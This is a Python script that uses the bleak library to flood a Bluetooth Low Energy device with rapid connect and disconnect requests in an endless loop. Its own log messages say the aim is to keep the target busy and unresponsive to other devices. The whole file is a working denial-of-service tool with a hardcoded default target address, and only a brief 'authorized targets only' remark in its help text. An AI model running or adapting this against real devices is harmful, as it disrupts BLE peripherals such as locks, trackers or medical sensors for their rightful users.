#!/usr/bin/env python3

import asyncio
import logging
import sys
from bleak import BleakClient
from bleak.exc import BleakError

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

logger = logging.getLogger("BLE_Saturator")


def _parse_args():
    import argparse
    p = argparse.ArgumentParser(description="Rapid BLE connect/disconnect saturation (authorized targets only).")
    p.add_argument("mac", nargs="?", default="00:1F:FF:C1:63:9F", help="target MAC (default: %(default)s)")
    p.add_argument("--timeout", type=float, default=0.5, help="per-attempt connect timeout seconds (default: %(default)s)")
    p.add_argument("--delay", type=float, default=0.05, help="delay between attempts (default: %(default)s)")
    return p.parse_args()

ARGS = _parse_args()
TARGET_MAC = ARGS.mac


class BLERapidSaturator:
    def __init__(self, mac: str):
        self.mac = mac.upper()
        self.attempts = 0

    async def run_saturation_loop(self):
        logger.info(
            f"[*] Starting Link-Layer Saturation on Target: {self.mac}"
        )
        logger.info(
            "[*] Target will be held in a busy/unresponsive state for other centrals."
        )
        logger.info("[*] Press Ctrl+C to stop.\n")

        while True:
            try:
                self.attempts += 1

                logger.info(
                    f"[{self.attempts}] Triggering connection request to {self.mac}..."
                )

                # Initiate link connection with a short timeout
                # This forces the target's Link Layer to process a connection handshake
                async with BleakClient(self.mac, timeout=ARGS.timeout) as client:

                    if client.is_connected:
                        logger.info(
                            "    [+] Handshake hit! "
                            "Tearing down link immediately...is_connected"
                        )

                        await client.disconnect()

                        logger.info(
                            "    [-] DISCONNECTED"
                        )

            except (BleakError, asyncio.TimeoutError):
                # Connection attempt timed out or target radio was busy processing
                pass

            except Exception as e:
                logger.debug(
                    f"Iteration error: {e}"
                )

            # Short delay before re-engaging
            await asyncio.sleep(ARGS.delay)


if __name__ == "__main__":
    saturator = BLERapidSaturator(TARGET_MAC)

    try:
        asyncio.run(
            saturator.run_saturation_loop()
        )

    except KeyboardInterrupt:
        logger.info(
            "\n[*] Saturation loop stopped by user."
        )
        sys.exit(0)
